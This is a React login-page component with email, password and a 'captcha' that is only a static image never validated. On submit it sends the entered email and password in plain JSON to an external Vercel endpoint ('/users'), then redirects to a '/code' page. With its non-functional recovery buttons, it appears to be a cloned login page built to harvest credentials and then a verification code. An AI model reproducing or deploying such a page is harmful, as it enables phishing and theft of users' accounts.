import React from "react";
import { useForm } from "react-hook-form";
import img1 from "../../Img/Capture1.PNG";
import "./Login.css";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const { register, handleSubmit } = useForm();
  let navigate = useNavigate();
  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://tryst-rubel-sarver-azure.vercel.app/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/code"));
  };

  return (
    <>
      <span className="sing">Log</span>
      <span className="up"> in</span>
      <form onSubmit={handleSubmit(onSubmit)}>
        <div className="pe-3 Email">
          {" "}
          <label htmlFor="kka" className="fw-bold">
            <span className="text-secondary fw-bold">Email</span>
          </label>
          <input
            className="form-control p-3"
            type="email"
            {...register("example")}
            required
          />
        </div>
        <div className="pe-3 Email">
          <label htmlFor="jaa" className="fw-bold">
            <span className="text-secondary fw-bold">Password</span>
          </label>
          <input
            className="form-control p-3"
            type="password"
            {...register("exampleRequired", { required: true })}
            required
          />
        </div>
        <div className="pe-3 Email">
          <label htmlFor="jaa" className="fw-bold">
            <span className="text-danger">*</span>{" "}
            <span className="text-secondary fw-bold">
              Please enter the characters shown inside the blue box
            </span>
          </label>
          <div>
            {" "}
            <img className="imgPic " src={img1} alt="" />
          </div>
          <input
            className="form-control p-3"
            {...register("exampleReq", { required: true })}
            required
          />
        </div>
        <div className="form-check Email">
          <input
            className="form-check-input"
            type="checkbox"
            value=""
            id="flexCheckDefault"
          />
          <label
            className="form-check-label text-dark fw-bold"
            for="flexCheckDefault"
          >
            Remember me for 14 days
          </label>
        </div>

        <div className=" Email">
          {" "}
          <input className="Provider1" type="submit" value="Log in" />
        </div>
      </form>
      <div className="mt-5">
        <button className=" Forgot"> Forgot your password? </button>
      </div>
      <div className="mt-2">
        <button className="receive">
          {" "}
          Didn't receive confirmation instructions?
        </button>
      </div>
      <div className="mb-5 mt-2">
        <button className="receive">
          {" "}
          I need help recovering access to my account
        </button>
      </div>
    </>
  );
};

export default Login;
